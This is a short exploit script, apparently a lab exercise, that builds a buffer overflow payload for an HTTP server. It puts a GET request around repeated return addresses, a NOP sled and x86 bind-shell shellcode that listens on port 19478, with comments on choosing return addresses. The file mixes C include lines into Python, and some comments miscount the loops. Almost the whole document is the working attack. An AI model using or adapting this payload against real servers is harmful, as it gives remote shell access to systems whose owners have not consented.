'''
shellcode: opens shell for port 19478 (4C16)
code for http://shell-storm.org/shellcode/files/shellcode-836.php
'''

#include <stdio.h>
#include <string.h>


'''
original return address to overwrite (for localhost)
(4294954988)10 = (FFFFCFEC)16

return address (for localhost): FFFFD050
\x50\xD0\xFF\xFF

no op
\x90

top of stack (for 32 bit)
0xbfffffff

shellcode port is (19478)10 = (4C16)16, the first two bytes in line 3 below.
'''

def makeAttackString():
	shellcode = "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"\
				"\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68"\
				"\x4c\x16\x6a\x10\x51\x50\xb0\x66\x89\xe1"\
				"\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd"\
				"\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f"\
				"\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f"\
				"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"\
				"\x41\xcd\x80"

	returnAddr = "\xFF\xFD\xFF\xBF"			# need to find correct return address for remote server
	attackString = "GET /"					# attack string must begin with GET

	noOp = "\x90"

	for i in range(40):						# adding 35 instances of new return address
 		attackString += returnAddr
	for i in range(624):					# adding 500 no-ops
		attackString += noOp
	attackString += shellcode + " HTTP"		# add shellcode to attack string, attack string must end with HTTP
	return attackString

print(makeAttackString())
# print("length:", len(makeAttackString()) % 256);